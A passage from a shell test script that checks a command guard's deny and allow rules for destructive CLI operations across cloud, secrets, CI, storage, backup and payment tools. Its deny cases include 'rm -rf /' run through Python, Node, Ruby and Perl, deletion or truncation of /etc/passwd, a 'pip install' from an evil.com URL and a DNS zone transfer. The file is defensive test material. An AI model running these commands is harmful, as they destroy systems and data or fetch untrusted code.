expect_deny 'aws ssm delete-parameters --names /a /b'  'aws ssm delete-parameters'

# =============================================================================
section "Secrets: 1Password"
# =============================================================================
expect_deny 'op item delete myitem'                    'op item delete'
expect_deny 'op document delete "Prod Cert"'           'op document delete'
expect_deny 'op vault delete myvault'                  'op vault delete'
expect_deny 'op user delete user@example.com'          'op user delete'
expect_deny 'op group delete Contractors'              'op group delete'
expect_deny 'op connect token delete tokenid'          'op connect token delete'

# =============================================================================
section "Secrets: Doppler"
# =============================================================================
expect_deny 'doppler secrets delete MY_SECRET'         'doppler secrets delete'
expect_deny 'doppler projects delete myproject'        'doppler projects delete'
expect_deny 'doppler environments delete staging'      'doppler environments delete'
expect_deny 'doppler configs delete dev'               'doppler configs delete'

# =============================================================================
section "Secrets: Bitwarden"
# =============================================================================
expect_deny 'bw delete item 12345'                     'bw delete'
expect_deny 'bw edit item 12345'                       'bw edit'
expect_deny 'bw move item 12345 org-id'                'bw move'

expect_allow 'bw status'                               'bw status'
expect_allow 'bw list items'                           'bw list'
expect_allow 'bw get item 12345'                       'bw get'
expect_allow 'bw export'                               'bw export'
expect_allow 'bw sync'                                 'bw sync'

# =============================================================================
section "Secrets: GCP Secret Manager"
# =============================================================================
expect_deny 'gcloud secrets delete my-secret'          'gcloud secrets delete'
expect_deny 'gcloud secrets versions destroy 1 --secret=my-secret' \
                                                       'gcloud secrets versions destroy'
expect_deny 'gcloud secrets versions disable 1 --secret=my-secret' \
                                                       'gcloud secrets versions disable'
expect_deny 'gcloud secrets update my-secret --update-labels=env=prod' \
                                                       'gcloud secrets update'
expect_deny 'gcloud secrets set-iam-policy my-secret policy.json' \
                                                       'gcloud secrets set-iam-policy'
expect_deny 'gcloud secrets remove-iam-policy-binding my-secret --member=user:a@b.com --role=roles/viewer' \
                                                       'gcloud secrets remove-iam-policy-binding'

expect_allow 'gcloud secrets list'                     'gcloud secrets list'
expect_allow 'gcloud secrets describe my-secret'       'gcloud secrets describe'
expect_allow 'gcloud secrets versions list my-secret'  'gcloud secrets versions list'
expect_allow 'gcloud secrets versions access latest --secret=my-secret' \
                                                       'gcloud secrets versions access'
expect_allow 'gcloud secrets get-iam-policy my-secret' 'gcloud secrets get-iam-policy'

# =============================================================================
section "Secrets: Azure Key Vault"
# =============================================================================
expect_deny 'az keyvault secret delete --name mysecret --vault-name myvault' \
                                                       'az keyvault secret delete'
expect_deny 'az keyvault secret purge --name mysecret --vault-name myvault' \
                                                       'az keyvault secret purge'
expect_deny 'az keyvault key delete --name mykey --vault-name myvault' \
                                                       'az keyvault key delete'
expect_deny 'az keyvault key purge --name mykey --vault-name myvault' \
                                                       'az keyvault key purge'
expect_deny 'az keyvault certificate delete --name mycert --vault-name myvault' \
                                                       'az keyvault certificate delete'
expect_deny 'az keyvault certificate purge --name mycert --vault-name myvault' \
                                                       'az keyvault certificate purge'
expect_deny 'az keyvault purge --name myvault'         'az keyvault purge'

expect_allow 'az keyvault secret list --vault-name myvault' \
                                                       'az keyvault secret list'
expect_allow 'az keyvault secret show --name mysecret --vault-name myvault' \
                                                       'az keyvault secret show'
expect_allow 'az keyvault key list --vault-name myvault' \
                                                       'az keyvault key list'
expect_allow 'az keyvault key show --name mykey --vault-name myvault' \
                                                       'az keyvault key show'
expect_allow 'az keyvault certificate list --vault-name myvault' \
                                                       'az keyvault certificate list'
expect_allow 'az keyvault show --name myvault'         'az keyvault show'

# =============================================================================
section "Secrets: LastPass"
# =============================================================================
expect_deny 'lpass rm mysite'                          'lpass rm'
expect_deny 'lpass edit mysite'                        'lpass edit'
expect_deny 'lpass mv mysite Business'                 'lpass mv'

expect_allow 'lpass status'                            'lpass status'
expect_allow 'lpass ls'                                'lpass ls'
expect_allow 'lpass show mysite'                       'lpass show'
expect_allow 'lpass export'                            'lpass export'

# =============================================================================
section "Secrets: Infisical"
# =============================================================================
expect_deny 'infisical secrets delete MY_SECRET'       'infisical secrets delete'
expect_deny 'infisical secrets set MY_SECRET=value'    'infisical secrets set'

expect_allow 'infisical run -- npm start'              'infisical run'
expect_allow 'infisical login'                         'infisical login'
expect_allow 'infisical export'                        'infisical export'
expect_allow 'infisical secrets get MY_SECRET'         'infisical secrets get'
expect_allow 'infisical scan'                          'infisical scan'

# =============================================================================
section "Secrets: Pass"
# =============================================================================
expect_deny 'pass rm email/personal'                   'pass rm'
expect_deny 'pass mv email/old email/new'              'pass mv'
expect_deny 'pass edit email/personal'                 'pass edit'
expect_deny 'pass insert email/new'                    'pass insert'
expect_deny 'pass generate email/new 20'               'pass generate'

expect_allow 'pass ls'                                 'pass ls'
expect_allow 'pass show email/personal'                'pass show'
expect_allow 'pass find email'                         'pass find'
expect_allow 'pass grep pattern'                       'pass grep'
expect_allow 'pass version'                            'pass version'

# =============================================================================
section "Secrets: Gopass"
# =============================================================================
expect_deny 'gopass rm email/personal'                 'gopass rm'
expect_deny 'gopass delete email/personal'             'gopass delete'
expect_deny 'gopass mv email/old email/new'            'gopass mv'
expect_deny 'gopass move email/old email/new'          'gopass move'
expect_deny 'gopass edit email/personal'               'gopass edit'
expect_deny 'gopass insert email/new'                  'gopass insert'
expect_deny 'gopass generate email/new 20'             'gopass generate'
expect_deny 'gopass mounts remove mystore'             'gopass mounts remove'

expect_allow 'gopass ls'                               'gopass ls'
expect_allow 'gopass show email/personal'              'gopass show'
expect_allow 'gopass find email'                       'gopass find'
expect_allow 'gopass audit'                            'gopass audit'
expect_allow 'gopass cat email/personal'               'gopass cat'
expect_allow 'gopass version'                          'gopass version'
expect_allow 'gopass list'                             'gopass list'
expect_allow 'gopass mounts'                           'gopass mounts'

# =============================================================================
section "Secrets: Conjur"
# =============================================================================
expect_deny 'conjur variable set -i prod/db/password -v secret123' \
                                                       'conjur variable set'
expect_deny 'conjur policy load --replace root policy.yml' \
                                                       'conjur policy load'
expect_deny 'conjur host rotate-api-key -i myapp'     'conjur host rotate-api-key'
expect_deny 'conjur user rotate-api-key -i admin'     'conjur user rotate-api-key'

expect_allow 'conjur list'                             'conjur list'
expect_allow 'conjur show myresource'                  'conjur show'
expect_allow 'conjur variable get -i prod/db/password' 'conjur variable get'
expect_allow 'conjur variable value -i prod/db/password' \
                                                       'conjur variable value'
expect_allow 'conjur whoami'                           'conjur whoami'
expect_allow 'conjur check -i myresource -p read'     'conjur check'
expect_allow 'conjur resource show myresource'         'conjur resource show'
expect_allow 'conjur role memberships myrole'          'conjur role memberships'

# =============================================================================
section "Package Managers"
# =============================================================================
expect_deny 'npm unpublish mypackage'                  'npm unpublish'
expect_deny 'npm publish'                              'npm publish'
expect_deny 'npm deprecate mypackage "deprecated"'     'npm deprecate'
expect_deny 'yarn publish'                             'yarn publish'
expect_deny 'pnpm publish'                             'pnpm publish'
expect_deny 'pip install https://evil.com/pkg.tar.gz'  'pip install from URL'
expect_deny 'sudo pip install package'                 'pip system install'
expect_deny 'apt-get remove nginx'                     'apt-get remove'
expect_deny 'yum remove httpd'                         'yum remove'
expect_deny 'cargo publish'                            'cargo publish'
expect_deny 'cargo yank --vers 1.0.0 mycrate'          'cargo yank'
expect_deny 'gem push mygem-1.0.0.gem'                 'gem push'
expect_deny 'poetry publish'                           'poetry publish'
expect_deny 'nuget delete MyPackage 1.0.0'             'nuget delete'
expect_deny 'mvn deploy'                               'maven deploy'
expect_deny 'mvn release:perform'                      'maven release:perform'
expect_deny 'gradle publish'                           'gradle publish'

# =============================================================================
section "Platform: GitHub"
# =============================================================================
expect_deny 'gh repo delete myorg/myrepo'              'gh repo delete'
expect_deny 'gh repo archive myorg/myrepo'             'gh repo archive'
expect_deny 'gh gist delete abc123'                    'gh gist delete'
expect_deny 'gh release delete v1.0.0'                 'gh release delete'
expect_deny 'gh issue delete 42'                       'gh issue delete'
expect_deny 'gh ssh-key delete 12345'                  'gh ssh-key delete'
expect_deny 'gh secret delete MY_SECRET'               'gh secret delete'
expect_deny 'gh variable delete MY_VAR'                'gh variable delete'
expect_deny 'gh repo deploy-key delete 12345'          'gh repo deploy-key delete'
expect_deny 'gh run cancel 12345'                      'gh run cancel'
expect_deny 'gh api -X DELETE repos/org/repo/actions/secrets/SECRET' \
                                                       'gh api DELETE actions secret'
expect_deny 'gh api -X DELETE repos/org/repo/actions/variables/VAR' \
                                                       'gh api DELETE actions variable'
expect_deny 'gh api -X DELETE repos/org/repo/hooks/1'  'gh api DELETE hook'
expect_deny 'gh api -X DELETE repos/org/repo/keys/1'   'gh api DELETE deploy key'
expect_deny 'gh api -X DELETE repos/org/repo/releases/1' \
                                                       'gh api DELETE release'
expect_deny 'gh api -X DELETE repos/org/repo'          'gh api DELETE repo'

# =============================================================================
section "Platform: GitLab"
# =============================================================================
expect_deny 'glab repo delete myproject'               'glab repo delete'
expect_deny 'glab repo archive myproject'              'glab repo archive'
expect_deny 'glab release delete v1.0.0'               'glab release delete'
expect_deny 'glab variable delete MY_VAR'              'glab variable delete'
expect_deny 'glab api -X DELETE /projects/1'           'glab api DELETE project'
expect_deny 'glab api -X DELETE /projects/1/releases/v1' \
                                                       'glab api DELETE release'
expect_deny 'glab api -X DELETE /projects/1/variables/VAR' \
                                                       'glab api DELETE variable'
expect_deny 'glab api -X DELETE /projects/1/protected_branches/main' \
                                                       'glab api DELETE protected branch'
expect_deny 'glab api -X DELETE /projects/1/hooks/1'   'glab api DELETE hook'
expect_deny 'gitlab-rails runner "Project.find(1).destroy"' \
                                                       'gitlab-rails runner destructive'
expect_deny 'gitlab-rake gitlab:cleanup:repos'         'gitlab-rake destructive'

# =============================================================================
section "CI/CD: GitHub Actions"
# =============================================================================
expect_deny 'gh secret remove MY_SECRET'               'gh actions secret remove'
expect_deny 'gh variable remove MY_VAR'                'gh actions variable remove'
expect_deny 'gh workflow disable ci.yml'               'gh actions workflow disable'
expect_deny 'gh run cancel 12345'                      'gh actions run cancel'
expect_deny 'gh api -X DELETE repos/org/repo/actions/secrets/SECRET' \
                                                       'gh api DELETE actions secrets'

# =============================================================================
section "CI/CD: GitLab CI"
# =============================================================================
expect_deny 'glab variable delete MY_VAR'              'glab ci variable delete'
expect_deny 'glab ci delete 12345'                     'glab ci delete'
expect_deny 'gitlab-runner unregister --all-runners'   'gitlab-runner unregister'

# =============================================================================
section "CI/CD: Jenkins"
# =============================================================================
expect_deny 'jenkins-cli delete-job myjob'             'jenkins delete-job'
expect_deny 'jenkins-cli delete-node mynode'            'jenkins delete-node'
expect_deny 'jenkins-cli delete-credentials domain cred' \
                                                       'jenkins delete-credentials'
expect_deny 'jenkins-cli delete-builds myjob 1-10'     'jenkins delete-builds'
expect_deny 'jenkins-cli delete-view myview'            'jenkins delete-view'
expect_deny 'curl -X POST http://jenkins.local/job/myjob/doDelete' \
                                                       'jenkins curl doDelete'

# =============================================================================
section "CI/CD: CircleCI"
# =============================================================================
expect_deny 'circleci context delete myorg mycontext'  'circleci context delete'
expect_deny 'circleci context remove-secret myorg mycontext MY_SECRET' \
                                                       'circleci context remove-secret'
expect_deny 'circleci orb delete myorg/myorb'          'circleci orb delete'
expect_deny 'circleci namespace delete myorg'          'circleci namespace delete'

# =============================================================================
section "Search: Elasticsearch"
# =============================================================================
expect_deny 'curl -X DELETE http://localhost:9200/myindex' \
                                                       'ES curl DELETE index'
expect_deny 'curl -X DELETE http://localhost:9200/myindex/_doc/1' \
                                                       'ES curl DELETE doc'
expect_deny 'curl -X POST http://localhost:9200/myindex/_close' \
                                                       'ES curl close index'
expect_deny 'curl -X POST http://localhost:9200/myindex/_delete_by_query' \
                                                       'ES curl delete by query'
expect_deny 'curl -X PUT http://localhost:9200/_cluster/settings -d "{\"persistent\":{\"cluster.routing.allocation.enable\":\"none\"}}"' \
                                                       'ES curl cluster settings'
expect_deny 'http DELETE http://localhost:9200/myindex' 'ES httpie DELETE index'
expect_deny 'http DELETE http://localhost:9200/myindex/_doc/1' \
                                                       'ES httpie DELETE doc'
expect_deny 'http POST http://localhost:9200/myindex/_close' \
                                                       'ES httpie close index'

# =============================================================================
section "Search: OpenSearch"
# =============================================================================
expect_deny 'aws opensearch delete-domain --domain-name mydomain' \
                                                       'aws opensearch delete-domain'
expect_deny 'curl -X DELETE https://search-domain.us-east-1.es.amazonaws.com/myindex' \
                                                       'OpenSearch curl DELETE index'

# =============================================================================
section "Search: Algolia"
# =============================================================================
expect_deny 'algolia indices delete myindex'           'algolia indices delete'
expect_deny 'algolia indices clear myindex'            'algolia indices clear'
expect_deny 'algolia rules delete myindex'             'algolia rules delete'
expect_deny 'algolia apikeys delete mykey'             'algolia apikeys delete'

# =============================================================================
section "Search: Meilisearch"
# =============================================================================
expect_deny 'curl -X DELETE http://localhost:7700/indexes/movies/documents/1' \
                                                       'meili curl delete document'
expect_deny 'curl -X DELETE http://localhost:7700/indexes/movies' \
                                                       'meili curl delete index'
expect_deny 'curl -X DELETE http://localhost:7700/keys/mykey' \
                                                       'meili curl delete key'

# =============================================================================
section "Messaging: Kafka"
# =============================================================================
expect_deny 'kafka-topics.sh --delete --topic my-topic' \
                                                       'kafka-topics delete'
expect_deny 'kafka-consumer-groups.sh --delete --group mygroup' \
                                                       'kafka-consumer-groups delete'
expect_deny 'kafka-consumer-groups.sh --reset-offsets --group mygroup --to-earliest' \
                                                       'kafka reset offsets'
expect_deny 'kafka-configs.sh --alter --delete-config retention.ms --topic mytopic' \
                                                       'kafka-configs delete-config'
expect_deny 'kafka-acls.sh --remove --allow-principal User:alice' \
                                                       'kafka-acls remove'
expect_deny 'kafka-delete-records.sh --bootstrap-server localhost:9092' \
                                                       'kafka-delete-records'
expect_deny 'rpk topic delete my-topic'                'rpk topic delete'

# =============================================================================
section "Messaging: RabbitMQ"
# =============================================================================
expect_deny 'rabbitmqadmin delete queue name=myqueue'  'rabbitmqadmin delete queue'
expect_deny 'rabbitmqadmin delete exchange name=myexch' \
                                                       'rabbitmqadmin delete exchange'
expect_deny 'rabbitmqadmin purge queue name=myqueue'   'rabbitmqadmin purge queue'
expect_deny 'rabbitmqctl delete_vhost myhost'          'rabbitmqctl delete_vhost'
expect_deny 'rabbitmqctl forget_cluster_node rabbit@node2' \
                                                       'rabbitmqctl forget_cluster_node'
expect_deny 'rabbitmqctl reset'                        'rabbitmqctl reset'
expect_deny 'rabbitmqctl force_reset'                  'rabbitmqctl force_reset'

# =============================================================================
section "Messaging: NATS"
# =============================================================================
expect_deny 'nats stream delete mystream'              'nats stream delete'
expect_deny 'nats stream purge mystream'               'nats stream purge'
expect_deny 'nats consumer delete mystream myconsumer' 'nats consumer delete'
expect_deny 'nats kv delete mybucket'                  'nats kv delete'
expect_deny 'nats object delete mybucket'              'nats object delete'
expect_deny 'nats account delete myaccount'            'nats account delete'

# =============================================================================
section "Messaging: AWS SQS/SNS"
# =============================================================================
expect_deny 'aws sqs delete-queue --queue-url https://sqs.us-east-1.amazonaws.com/123/myqueue' \
                                                       'aws sqs delete-queue'
expect_deny 'aws sqs purge-queue --queue-url https://sqs.us-east-1.amazonaws.com/123/myqueue' \
                                                       'aws sqs purge-queue'
expect_deny 'aws sqs delete-message-batch --queue-url url --entries entries' \
                                                       'aws sqs delete-message-batch'
expect_deny 'aws sns delete-topic --topic-arn arn:aws:sns:us-east-1:123:mytopic' \
                                                       'aws sns delete-topic'
expect_deny 'aws sns unsubscribe --subscription-arn arn:aws:sns:us-east-1:123:topic:sub' \
                                                       'aws sns unsubscribe'

# =============================================================================
section "Storage: S3"
# =============================================================================
expect_deny 'aws s3 rb s3://mybucket'                  'aws s3 rb (remove bucket)'
expect_deny 'aws s3 rm s3://mybucket/path --recursive' 'aws s3 rm recursive'
expect_deny 'aws s3 sync . s3://bucket --delete'       'aws s3 sync delete'
expect_deny 'aws s3api delete-bucket --bucket mybucket' \
                                                       'aws s3api delete-bucket'
expect_deny 'aws s3api delete-object --bucket mybucket --key mykey' \
                                                       'aws s3api delete-object'
expect_deny 'aws s3api delete-objects --bucket mybucket --delete file://objects.json' \
                                                       'aws s3api delete-objects'

# =============================================================================
section "Storage: GCS"
# =============================================================================
expect_deny 'gsutil rb gs://mybucket'                  'gsutil rb'
expect_deny 'gsutil rm -r gs://mybucket/**'            'gsutil rm recursive'
expect_deny 'gsutil rsync -d source/ gs://bucket/'     'gsutil rsync -d (delete)'
expect_deny 'gcloud storage buckets delete gs://mybucket' \
                                                       'gcloud storage buckets delete'
expect_deny 'gcloud storage objects delete gs://bucket/key' \
                                                       'gcloud storage objects delete'
expect_deny 'gcloud storage rm gs://bucket/key'        'gcloud storage rm'

# =============================================================================
section "Storage: MinIO"
# =============================================================================
expect_deny 'mc rb myminio/mybucket'                   'mc rb (remove bucket)'
expect_deny 'mc rm --recursive myminio/mybucket'       'mc rm recursive'
expect_deny 'mc admin bucket delete myminio/mybucket'  'mc admin bucket delete'
expect_deny 'mc admin user remove myminio myuser'      'mc admin user remove'
expect_deny 'mc admin policy remove myminio mypolicy'  'mc admin policy remove'

# =============================================================================
section "Storage: Azure Blob"
# =============================================================================
expect_deny 'az storage container delete -n mycontainer' \
                                                       'az storage container delete'
expect_deny 'az storage blob delete-batch -s container' \
                                                       'az storage blob delete-batch'
expect_deny 'az storage blob delete -c container -n blob' \
                                                       'az storage blob delete'
expect_deny 'az storage account delete -n myaccount'   'az storage account delete'
expect_deny 'azcopy remove "https://myaccount.blob.core.windows.net/container"' \
                                                       'azcopy remove'
expect_deny 'azcopy sync source "https://dest" --delete-destination=true' \
                                                       'azcopy sync --delete-destination'

# =============================================================================
section "DNS: Cloudflare"
# =============================================================================
expect_deny 'wrangler dns delete zone-id record-id'    'wrangler dns delete'

# =============================================================================
section "DNS: Route53"
# =============================================================================
expect_deny 'aws route53 delete-hosted-zone --id Z123' 'route53 delete-hosted-zone'
expect_deny 'aws route53 change-resource-record-sets --hosted-zone-id Z123 --change-batch DELETE' \
                                                       'route53 change-resource-record-sets DELETE'
expect_deny 'aws route53 delete-health-check --health-check-id abc' \
                                                       'route53 delete-health-check'
expect_deny 'aws route53 delete-query-logging-config --id abc' \
                                                       'route53 delete-query-logging-config'
expect_deny 'aws route53 delete-traffic-policy --id abc --version 1' \
                                                       'route53 delete-traffic-policy'

# =============================================================================
section "DNS: Generic"
# =============================================================================
expect_deny 'nsupdate -k keyfile <<< "update delete example.com A"' \
                                                       'nsupdate delete'
expect_deny 'nsupdate -l'                              'nsupdate local'
expect_deny 'dig axfr example.com @ns1.example.com'    'dig zone transfer'

# =============================================================================
section "CDN: Cloudflare Workers"
# =============================================================================
expect_deny 'wrangler delete'                          'wrangler delete'
expect_deny 'wrangler deployments rollback'            'wrangler deployments rollback'
expect_deny 'wrangler kv:key delete --namespace-id abc mykey' \
                                                       'wrangler kv key delete'
expect_deny 'wrangler kv:namespace delete --namespace-id abc' \
                                                       'wrangler kv namespace delete'
expect_deny 'wrangler kv:bulk delete --namespace-id abc keys.json' \
                                                       'wrangler kv bulk delete'
expect_deny 'wrangler r2 object delete bucket/key'     'wrangler r2 object delete'
expect_deny 'wrangler r2 bucket delete mybucket'       'wrangler r2 bucket delete'
expect_deny 'wrangler d1 delete mydb'                  'wrangler d1 delete'

# =============================================================================
section "CDN: Fastly"
# =============================================================================
expect_deny 'fastly service delete'                    'fastly service delete'
expect_deny 'fastly domain delete'                     'fastly domain delete'
expect_deny 'fastly backend delete'                    'fastly backend delete'
expect_deny 'fastly vcl delete'                        'fastly vcl delete'
expect_deny 'fastly dictionary delete'                 'fastly dictionary delete'
expect_deny 'fastly dictionary-item delete'            'fastly dictionary-item delete'
expect_deny 'fastly acl delete'                        'fastly acl delete'
expect_deny 'fastly acl-entry delete'                  'fastly acl-entry delete'
expect_deny 'fastly logging s3 delete'                 'fastly logging delete'
expect_deny 'fastly service version activate'          'fastly version activate'
expect_deny 'fastly compute delete'                    'fastly compute delete'

# =============================================================================
section "CDN: CloudFront"
# =============================================================================
expect_deny 'aws cloudfront delete-distribution --id E123' \
                                                       'cloudfront delete-distribution'
expect_deny 'aws cloudfront delete-cache-policy --id abc' \
                                                       'cloudfront delete-cache-policy'
expect_deny 'aws cloudfront delete-origin-request-policy --id abc' \
                                                       'cloudfront delete-origin-request-policy'
expect_deny 'aws cloudfront delete-function --name myfunc --if-match etag' \
                                                       'cloudfront delete-function'
expect_deny 'aws cloudfront delete-response-headers-policy --id abc' \
                                                       'cloudfront delete-response-headers-policy'
expect_deny 'aws cloudfront delete-key-group --id abc' 'cloudfront delete-key-group'
expect_deny 'aws cloudfront create-invalidation --distribution-id E123 --paths "/*"' \
                                                       'cloudfront create-invalidation'

# =============================================================================
section "Email: SES"
# =============================================================================
expect_deny 'aws ses delete-identity --identity email@example.com' \
                                                       'ses delete-identity'
expect_deny 'aws ses delete-template --template-name mytemplate' \
                                                       'ses delete-template'
expect_deny 'aws ses delete-configuration-set --configuration-set-name myset' \
                                                       'ses delete-configuration-set'
expect_deny 'aws ses delete-receipt-rule-set --rule-set-name myruleset' \
                                                       'ses delete-receipt-rule-set'
expect_deny 'aws sesv2 delete-email-identity --email-identity domain.com' \
                                                       'sesv2 delete-email-identity'
expect_deny 'aws sesv2 delete-email-template --template-name mytemplate' \
                                                       'sesv2 delete-email-template'
expect_deny 'aws sesv2 delete-configuration-set --configuration-set-name myset' \
                                                       'sesv2 delete-configuration-set'
expect_deny 'aws sesv2 delete-contact-list --contact-list-name mylist' \
                                                       'sesv2 delete-contact-list'

# =============================================================================
section "Monitoring: Splunk"
# =============================================================================
expect_deny 'splunk remove index myindex'              'splunk remove index'
expect_deny 'splunk clean eventdata -index myindex'    'splunk clean eventdata'

# =============================================================================
section "Monitoring: Datadog"
# =============================================================================
expect_deny 'datadog-ci monitors delete 12345'         'datadog-ci monitors delete'
expect_deny 'datadog-ci dashboards delete abc-def'     'datadog-ci dashboards delete'
expect_deny 'curl -X DELETE https://api.datadoghq.com/api/v1/monitor/12345' \
                                                       'datadog api delete'

# =============================================================================
section "Monitoring: PagerDuty"
# =============================================================================
expect_deny 'pd service delete PXXXXXX'                'pd service delete'
expect_deny 'pd schedule delete PXXXXXX'               'pd schedule delete'
expect_deny 'pd escalation-policy delete PXXXXXX'      'pd escalation-policy delete'
expect_deny 'pd user delete PXXXXXX'                   'pd user delete'
expect_deny 'pd team delete PXXXXXX'                   'pd team delete'

# =============================================================================
section "Monitoring: New Relic"
# =============================================================================
expect_deny 'newrelic entity delete --guid abc'        'newrelic entity delete'
expect_deny 'newrelic apm application delete --applicationId 123' \
                                                       'newrelic apm app delete'
expect_deny 'newrelic workload delete --guid abc'      'newrelic workload delete'
expect_deny 'newrelic synthetics delete --monitorId abc' \
                                                       'newrelic synthetics delete'

# =============================================================================
section "Monitoring: Prometheus/Grafana"
# =============================================================================
expect_deny 'kubectl delete prometheusrule myrule'     'kubectl delete prometheusrule'
expect_deny 'grafana-cli plugins uninstall myplugin'   'grafana-cli plugins uninstall'
expect_deny 'curl -X DELETE http://grafana:3000/api/dashboards/uid/abc' \
                                                       'grafana api delete dashboard'
expect_deny 'curl -X DELETE http://grafana:3000/api/datasources/1' \
                                                       'grafana api delete datasource'

# =============================================================================
section "Backup: Borg"
# =============================================================================
expect_deny 'borg delete /repo::archive'               'borg delete'
expect_deny 'borg prune /repo'                         'borg prune'
expect_deny 'borg compact /repo'                       'borg compact'
expect_deny 'borg recreate /repo::archive'             'borg recreate'
expect_deny 'borg break-lock /repo'                    'borg break-lock'

# =============================================================================
section "Backup: Restic"
# =============================================================================
expect_deny 'restic forget latest'                     'restic forget'
expect_deny 'restic prune'                             'restic prune'
expect_deny 'restic key remove 3'                      'restic key remove'
expect_deny 'restic unlock --remove-all'               'restic unlock --remove-all'
expect_deny 'restic cache --cleanup'                   'restic cache cleanup'

# =============================================================================
section "Backup: rclone"
# =============================================================================
expect_deny 'rclone sync source: dest:'                'rclone sync'
expect_deny 'rclone delete remote:bucket'              'rclone delete'
expect_deny 'rclone deletefile remote:bucket/file.txt' 'rclone deletefile'
expect_deny 'rclone purge remote:bucket'               'rclone purge'
expect_deny 'rclone cleanup remote:'                   'rclone cleanup'
expect_deny 'rclone dedupe remote:bucket'              'rclone dedupe'
expect_deny 'rclone move /local remote:bucket'         'rclone move'

# =============================================================================
section "Backup: Velero"
# =============================================================================
expect_deny 'velero backup delete mybackup'            'velero backup delete'
expect_deny 'velero schedule delete myschedule'        'velero schedule delete'
expect_deny 'velero restore delete myrestore'          'velero restore delete'
expect_deny 'velero backup-location delete mylocation' 'velero backup-location delete'
expect_deny 'velero snapshot-location delete myloc'    'velero snapshot-location delete'
expect_deny 'velero uninstall'                         'velero uninstall'

# =============================================================================
section "Interpreters: Python"
# =============================================================================
expect_deny 'python -c "import shutil; shutil.rmtree(\"/var\")"' \
                                                       'python shutil.rmtree'
expect_deny 'python -c "import os; os.remove(\"/etc/passwd\")"' \
                                                       'python os.remove'
expect_deny 'python -c "import os; os.rmdir(\"/var\")"' \
                                                       'python os.rmdir'
expect_deny 'python -c "import os; os.system(\"rm -rf /\")"' \
                                                       'python os.system rm -rf'
expect_deny 'python -c "import subprocess; subprocess.run([\"rm\", \"-rf\", \"/\"])"' \
                                                       'python subprocess destructive'
expect_deny 'python -c "from pathlib import Path; import shutil; shutil.rmtree(Path(\"/var\"))"' \
                                                       'python pathlib rmtree'
expect_deny 'python -c "open(\"/etc/passwd\", \"w\").truncate()"' \
                                                       'python open write truncate'

# =============================================================================
section "Interpreters: Node.js"
# =============================================================================
expect_deny 'node -e "fs.rmSync(\"/var\", {recursive:true})"' \
                                                       'node fs.rmSync'
expect_deny 'node -e "fs.unlinkSync(\"/etc/passwd\")"' 'node fs.unlinkSync'
expect_deny 'node -e "require(\"child_process\").execSync(\"rm -rf /\")"' \
                                                       'node child_process exec'
expect_deny 'node -e "const fs = require(\"fs\"); fs.rm(\"/var\", {recursive:true}, ()=>{})"' \
                                                       'node fs.rm async'
expect_deny 'node -e "fs.writeFileSync(\"/etc/passwd\", \"\")"' \
                                                       'node fs.writeFileSync truncate'

# =============================================================================
section "Interpreters: Ruby"
# =============================================================================
expect_deny 'ruby -e "FileUtils.rm_rf(\"/var\")"'      'ruby FileUtils.rm_rf'
expect_deny 'ruby -e "FileUtils.rm(\"/etc/passwd\")"'  'ruby FileUtils.rm'
expect_deny 'ruby -e "File.delete(\"/etc/passwd\")"'   'ruby File.delete'
expect_deny 'ruby -e "Dir.rmdir(\"/var\")"'             'ruby Dir.rmdir'
expect_deny 'ruby -e "system(\"rm -rf /\")"'            'ruby system exec'

# =============================================================================
section "Interpreters: Perl"
# =============================================================================
expect_deny 'perl -e "use File::Path; remove_tree(\"/var\")"' \
                                                       'perl remove_tree'
expect_deny 'perl -e "unlink(\"/etc/passwd\")"'         'perl unlink'
expect_deny 'perl -e "rmdir(\"/var\")"'                  'perl rmdir'
expect_deny 'perl -e "system(\"rm -rf /\")"'             'perl system exec'

# =============================================================================
section "Feature Flags: LaunchDarkly"
# =============================================================================
expect_deny 'ldcli flags delete --project default --key my-flag' \
                                                       'ldcli flags delete'
expect_deny 'ldcli flags archive --project default --key my-flag' \
                                                       'ldcli flags archive'
expect_deny 'ldcli projects delete --key myproject'    'ldcli projects delete'
expect_deny 'ldcli environments delete --project default --key staging' \
                                                       'ldcli environments delete'
expect_deny 'ldcli segments delete --project default --env prod --key myseg' \
                                                       'ldcli segments delete'

# =============================================================================
section "Feature Flags: Flipt"
# =============================================================================
expect_deny 'flipt flag delete myflag'                 'flipt flag delete'
expect_deny 'flipt segment delete mysegment'           'flipt segment delete'
expect_deny 'flipt namespace delete mynamespace'       'flipt namespace delete'
expect_deny 'flipt rule delete myrule'                 'flipt rule delete'

# =============================================================================
section "Feature Flags: Split"
# =============================================================================
expect_deny 'split splits delete my-split'             'split splits delete'
expect_deny 'split splits kill my-split'               'split splits kill'
expect_deny 'split environments delete staging'        'split environments delete'

# =============================================================================
section "Feature Flags: Unleash"
# =============================================================================
expect_deny 'unleash features delete my-toggle'        'unleash features delete'
expect_deny 'unleash features archive my-toggle'       'unleash features archive'
expect_deny 'unleash projects delete myproject'        'unleash projects delete'

# =============================================================================
section "Payment: Stripe"
# =============================================================================
expect_deny 'stripe customers delete cus_12345'        'stripe customers delete'
expect_deny 'stripe products delete prod_12345'        'stripe products delete'
expect_deny 'stripe prices delete price_12345'         'stripe prices delete'
expect_deny 'stripe webhook_endpoints delete we_12345' 'stripe webhook_endpoints delete'
expect_deny 'stripe coupons delete COUPON20'            'stripe coupons delete'
expect_deny 'stripe api_keys roll rk_live_xxx'         'stripe api_keys roll'
expect_deny 'curl -X DELETE https://api.stripe.com/v1/customers/cus_12345' \
                                                       'stripe api DELETE'

# =============================================================================
section "Payment: Braintree"
# =============================================================================
expect_deny 'curl -X DELETE https://api.braintreegateway.com/merchants/id/customers/cust' \
                                                       'braintree api delete'

# =============================================================================
section "Payment: Square"
# =============================================================================
expect_deny 'curl -X DELETE https://connect.squareup.com/v2/catalog/object/abc' \
                                                       'square api delete catalog'

# =============================================================================
section "API Gateway: AWS"
# =============================================================================
expect_deny 'aws apigateway delete-rest-api --rest-api-id abc123' \
                                                       'apigateway delete-rest-api'
expect_deny 'aws apigateway delete-resource --rest-api-id abc --resource-id xyz' \
                                                       'apigateway delete-resource'
expect_deny 'aws apigateway delete-method --rest-api-id abc --resource-id xyz --http-method GET' \
                                                       'apigateway delete-method'
expect_deny 'aws apigateway delete-stage --rest-api-id abc --stage-name prod' \
                                                       'apigateway delete-stage'
expect_deny 'aws apigateway delete-deployment --rest-api-id abc --deployment-id xyz' \
                                                       'apigateway delete-deployment'
expect_deny 'aws apigateway delete-api-key --api-key abc' \
                                                       'apigateway delete-api-key'
expect_deny 'aws apigateway delete-authorizer --rest-api-id abc --authorizer-id xyz' \
                                                       'apigateway delete-authorizer'
